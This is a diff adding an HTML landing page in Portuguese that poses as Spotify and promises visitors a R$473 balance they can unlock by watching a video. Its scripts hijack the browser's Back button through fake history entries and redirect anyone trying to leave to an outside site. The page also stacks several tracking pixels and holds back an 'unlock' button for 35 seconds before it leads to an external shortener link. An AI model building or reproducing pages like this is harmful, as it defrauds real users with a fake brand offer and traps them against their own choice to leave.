@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>
+  const link = 'https://appsoficialbrasil.site/spotify/back';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+    <script>
+  window.pixelId = "673aa0dbf38f512db89a52d2";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script>
+  window.pixelId = "6736c285892b86d8172674fd";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Avaliação - VSL</title>
+
+    <!-- Script da UTMify em iframe isolado -->
+    <script src="../../../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <!-- Estilos -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #FFFFFF;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            background-color: #1DB954;
+            color: white;
+            font-weight: bold;
+            text-align: center;
+            padding: 10px;
+            font-size: 16px;
+        }
+        #p1 {
+            width: 100%;
+            max-width: 400px;
+            background-color: #FFFFFF;
+            padding: 15px;
+            border-bottom: 1px solid #202020;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        #logo { width: 70px; margin-left: 5px; }
+        .boxSaldo {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            border: 2px solid #1DB954;
+            border-radius: 6px;
+            padding: 5px 10px;
+            margin-right: 5px;
+        }
+        .textoSaldo { font-size: 10px; font-weight: bold; background: #fff; padding: 2px 5px; color: #333; }
+        .valorSaldo { font-size: 14px; font-weight: 700; color: #333; }
+        #produto1 {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        #produto1 h4 { color: #1DB954; font-size: 18px; margin-bottom: 10px; }
+        .centralizar { width: 100%; display: flex; justify-content: center; }
+        button {
+            background-color: #1DB954;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 85%;
+            max-width: 300px;
+            height: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover { background-color: #17a74a; }
+        .elementor-element:has(#vid_6734b3c53c47ae000a0b7ef7) { width: 100%; }
+        @media (max-width: 480px) { #p1 { flex-direction: row; justify-content: space-between; } }
+    </style>
+    <script>
+  window.pixelId = "670d0a90d882f256a39fc839";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+    <!-- Cabeçalho -->
+    <div class="header">
+        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+    </div>
+
+    <!-- Saldo e Informações -->
+    <div id="p1">
+        <img id="logo" src="images/spotify2-logo.png" alt="Spotify Logo">
+        <div class="boxSaldo">
+            <span class="textoSaldo">SALDO</span>
+            <span class="valorSaldo">R$ <span class="saldoAtualizado">473.00</span></span>
+        </div>
+    </div>
+
+    <!-- Conteúdo do Vídeo com nova estrutura -->
+    <div id="produto1">
+        <h4>DESBLOQUEIO DE SALDO</h4>
+        <p>Veja como liberar seu saque assistindo ao vídeo.</p>
+
+        <!-- Estrutura do player de vídeo com embed atualizado -->
+<div id="vid_6765927e572299dbc2d7fc76" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_6765927e572299dbc2d7fc76" src="images/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_6765927e572299dbc2d7fc76" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> <script type="text/javascript" id="scr_6765927e572299dbc2d7fc76"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/58dd5b99-b516-4e0d-9083-c6e04398459c/players/6765927e572299dbc2d7fc76/player.js", s.async=!0,document.head.appendChild(s); </script>
+
+
+        <!-- Botão para Desbloquear -->
+        <div id="botaoDesbloquear" class="centralizar" style="margin-top: 20px; display: none;">
+            <a id="desbloquearLink" href="https://go.disruptybr.com.br/rcnqj" style="width: 100%; text-decoration: none;">
+                <button>DESBLOQUEAR AGORA</button>
+            </a>
+        </div>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-4JP5N9ED3X"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4JP5N9ED3X');
+</script>
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                // Função para mostrar o botão após 35 segundos
+                setTimeout(function() {
+                    document.getElementById("botaoDesbloquear").style.display = "flex";
+                }, 35000); // 35 segundos de delay
+
+                // Script para adicionar parâmetros de URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const paramsString = urlParams.toString();
+                const desbloquearLink = document.getElementById("desbloquearLink");
+
+                if (paramsString) {
+                    desbloquearLink.href += `?${paramsString}`;
+                }
+            });
+        </script>
+    </div>
+
+<script>
+  window.pixelId = "670d0a90d882f256a39fc839";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "../../../cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+</body></html>
